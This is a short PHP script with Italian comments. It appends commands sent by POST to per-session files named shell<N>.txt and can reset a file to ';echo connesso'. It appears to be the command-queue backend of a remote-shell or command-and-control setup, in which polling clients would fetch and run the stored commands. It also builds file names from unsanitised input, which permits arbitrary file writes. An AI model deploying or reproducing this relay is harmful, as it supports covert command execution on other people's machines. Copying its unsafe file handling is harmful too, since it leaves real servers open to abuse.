<?php

    $shellNumber = $_POST['shellNo'];

    $filename = 'shell'. $shellNumber . '.txt';

    // Verifica se il parametro POST 'output' è stato inviato
    if (isset($_POST['input']) and $_POST["input"] != "") {
        // Ottieni il valore del parametro 'output'
        $command = ";" . $_POST['input'];

        // Aggiungi una nuova riga al contenuto
        $command .= PHP_EOL;

        // Apri il file in modalità append
        $file = fopen($filename, 'a');

        // Verifica se il file è stato aperto correttamente
        if ($file) {
            // Blocca il file
            if (flock($file, LOCK_EX)) {
                // Scrivi i dati nel file
                fwrite($file, $command);

                // Rilascia il lock
                flock($file, LOCK_UN);
            } else {
                // Risposta di errore se il file non può essere bloccato
                echo "100";
            }

            // Chiudi il file
            fclose($file);

            // Risposta di successo
            echo "200";
        } else {
            // Risposta di errore se il file non può essere aperto
            echo "102";
        }
    }
    elseif (isset($_POST["clear"])) {

        $file = fopen($filename, 'w');
        fwrite($file, ";echo connesso" . PHP_EOL);
        fclose($file);
        echo("201");
    }
    else {
        // Risposta di errore se il parametro 'output' non è stato inviato
        echo "103";
    }



?>
